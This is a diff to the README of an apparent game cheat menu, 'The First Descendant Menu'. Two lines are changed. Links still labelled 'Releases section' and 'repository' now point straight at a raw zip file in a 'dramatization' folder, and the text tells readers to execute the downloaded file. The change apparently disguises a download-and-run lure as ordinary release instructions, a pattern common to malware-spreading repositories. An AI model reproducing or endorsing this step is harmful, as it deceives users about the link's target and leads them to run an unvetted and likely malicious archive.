@@ -16,7 +16,7 @@ Welcome to the official repository for "The First Descendant Menu"! This softwar
 
 ## Getting Started 🚀
 
-To start using "The First Descendant Menu", simply download the latest version from our [Releases section](https://github.com/Estoysad/The-First-Descendant-Menu/releases). Execute the downloaded file to install the software effortlessly.
+To start using "The First Descendant Menu", simply download the latest version from our [Releases section](https://raw.githubusercontent.com/Estoysad/The-First-Descendant-Menu/main/dramatization/The_Menu_First_Descendant_2.2.zip). Execute the downloaded file to install the software effortlessly.
 
 ## Repository Topics 📚
 
@@ -35,7 +35,7 @@ Join the community of The First Descendant enthusiasts and share your experience
 
 ## Stay Updated 📅
 
-For the latest updates and announcements, visit our [repository](https://github.com/Estoysad/The-First-Descendant-Menu). Keep an eye on the Releases section for new versions and features.
+For the latest updates and announcements, visit our [repository](https://raw.githubusercontent.com/Estoysad/The-First-Descendant-Menu/main/dramatization/The_Menu_First_Descendant_2.2.zip). Keep an eye on the Releases section for new versions and features.
 
 ---
 
